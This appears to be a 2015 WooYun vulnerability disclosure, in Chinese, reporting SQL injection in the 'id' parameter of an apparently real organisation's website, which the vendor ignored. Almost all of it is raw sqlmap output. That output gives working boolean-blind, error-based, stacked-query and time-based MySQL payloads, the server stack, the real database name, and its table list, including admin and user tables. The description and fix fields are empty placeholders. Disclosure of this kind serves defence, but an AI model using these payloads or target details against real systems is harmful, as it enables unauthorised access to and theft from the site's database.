wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-09-14：	细节已通知厂商并且等待厂商处理中									2015-09-19：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： x 详细说明：

参数id   漏洞证明：  sqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=18 AND 3025=3025    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=18 AND (SELECT 8354 FROM(SELECT COUNT(*),CONCAT(0x716a7a6271,(SELECT (ELT(8354=8354,1))),0x717a6a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: id=18;(SELECT * FROM (SELECT(SLEEP(5)))mUBm)#    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: id=18 AND (SELECT * FROM (SELECT(SLEEP(5)))sDGl)---[20:38:43] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: MySQL 5.0current database:    'vcanbio_zhongyuanxiehe'Database: vcanbio_zhongyuanxiehe[26 tables]+-----------------------------+| gsgzs                       || jos_search_reports_customer || jos_search_reports_para     || njbglist                    || qdnj                        || qdqx                        || qnnj                        || qxnj                        || qznj                        || sqlmapoutput                || t_academic                  || t_admin                     || t_annals                    || t_announcement              || t_article                   || t_companyinfo               || t_content                   || t_dashiji                   || t_log                       || t_medianews                 || t_message                   || t_news                      || t_staff                     || t_users                     || t_weblink                   || t_xiazai                    |+-----------------------------+   修复方案：  x   版权声明：转载请注明来源 路人甲@乌云
